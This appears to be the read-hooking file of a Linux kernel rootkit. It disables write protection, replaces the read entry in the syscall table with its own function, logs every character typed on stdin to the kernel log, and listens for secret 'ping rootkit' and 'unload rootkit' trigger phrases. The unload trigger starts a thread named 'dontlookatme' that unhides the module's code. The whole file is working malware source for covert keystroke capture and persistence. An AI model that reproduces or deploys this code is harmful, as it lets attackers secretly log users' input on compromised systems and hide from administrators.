#include "read_hooking.h"
#include "hooking.h"
#include "code_hiding.h"

#define CR 13
#define DEL 127
static const char * pingCommand = "ping rootkit";
const int pingCommandLen = 12;
static int checkPingCommandCount = 0;
static const char * unloadCommand = "unload rootkit";
const int unloadCommandLen = 14;
static int checkUnloadCommandCount = 0;
int r_count = 0;

ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);

static ssize_t my_read(int fd, void *buf, size_t count){
  ssize_t retVal;
  int i;
  char c;
  r_count++;
  retVal = orig_sys_read(fd, buf, count);
  if(fd == 0){ //stdin
    for(i=0; i<count; i++){
      c = ((char *)buf)[i];
      switch(c){
        case CR:
          if(checkPingCommandCount == pingCommandLen){
            printk(KERN_INFO "pong\n");
          }else if(checkUnloadCommandCount == unloadCommandLen){
            //kthread_run(unhook_read, NULL, "dontlookatme");
            kthread_run(unhide_code, NULL, "dontlookatme");
            printk(KERN_INFO "unload\n");      
          }
          checkPingCommandCount = 0;
          checkUnloadCommandCount = 0;
          break;
        case DEL:
          if(checkPingCommandCount > 0){
            checkPingCommandCount --;
          }else if(checkPingCommandCount <0){
            checkPingCommandCount ++;
          }
          if(checkUnloadCommandCount >0){
            checkUnloadCommandCount--;
          }else if(checkUnloadCommandCount <0){
            checkUnloadCommandCount ++;
          }
          break;
        default:
          printk(KERN_INFO "%d, %c\n", c, c);      
          if(checkPingCommandCount>=0 && checkPingCommandCount<pingCommandLen && c == pingCommand[checkPingCommandCount]){
            //printk(KERN_INFO "check ping count: %d\n", checkPingCommandCount);
            checkPingCommandCount++;
          }else{
            if(checkPingCommandCount >0){
              checkPingCommandCount = -1;
            }else{
              checkPingCommandCount --;
            }
          }
          if(checkUnloadCommandCount>=0 && checkUnloadCommandCount<unloadCommandLen && c == unloadCommand[checkUnloadCommandCount]){
            checkUnloadCommandCount++;
            //printk(KERN_INFO "check unload count: %d\n", checkUnloadCommandCount);
          }else{
            if(checkUnloadCommandCount>0){
              checkUnloadCommandCount = -1;
            }else{
              checkUnloadCommandCount --;
            }
          }
      }

    }
  }
  r_count--;
  return retVal;
}

void hook_read(void){
  disable_wp();
  orig_sys_read = syscall_table[__NR_read];
  syscall_table[__NR_read] = my_read;
  enable_wp();
}

void unhook_read(void){
  disable_wp();
  syscall_table[__NR_read] = orig_sys_read;
  enable_wp();
  while(r_count > 0){ //hack to unblock read
    printk(KERN_INFO "\n");
  }
}
